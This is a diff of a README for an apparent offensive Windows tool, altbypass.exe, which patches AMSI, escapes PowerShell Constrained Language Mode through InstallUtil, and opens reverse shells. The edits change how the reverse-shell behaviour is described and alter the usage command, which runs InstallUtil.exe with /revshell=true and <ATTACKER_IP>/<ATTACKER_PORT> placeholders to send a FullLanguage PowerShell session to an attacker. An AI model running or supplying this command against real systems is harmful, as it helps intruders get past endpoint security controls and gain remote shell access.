@@ -15,7 +15,7 @@ The AMSI patch works by locating `AmsiUacInitialize` and then locating the actua
 
 Has builtin InstallUtils bypass ability.
 
-I have also added the reverse shell functionality as implemented in [padovah4ck/PSByPassCLM](https://github.com/padovah4ck/PSByPassCLM). You can now get PowerShell FullLanguage Mode reverse shells, as a new process!
+I have also added the reverse shell functionality as implemented in [padovah4ck/PSByPassCLM](https://github.com/padovah4ck/PSByPassCLM). You can now get PowerShell FullLanguage Mode reverse shells, but note that the process you run it from will stall until you exit the PS Session. This is because the `installUtil` program won't finish until yours does.
 
 ### Usage
 To run a PS FullLanguageMode Session in your current console:
@@ -33,7 +33,7 @@ To get a reverse shell:
 altbypass.exe
 
 # with bypass
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=<ATTACKER_IP> /rport=<ATTACKER_PORT> /U <path>\altbypass.exe &
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=<ATTACKER_IP> /rport=<ATTACKER_PORT> /U <path>\altbypass.exe
 ```
 
 
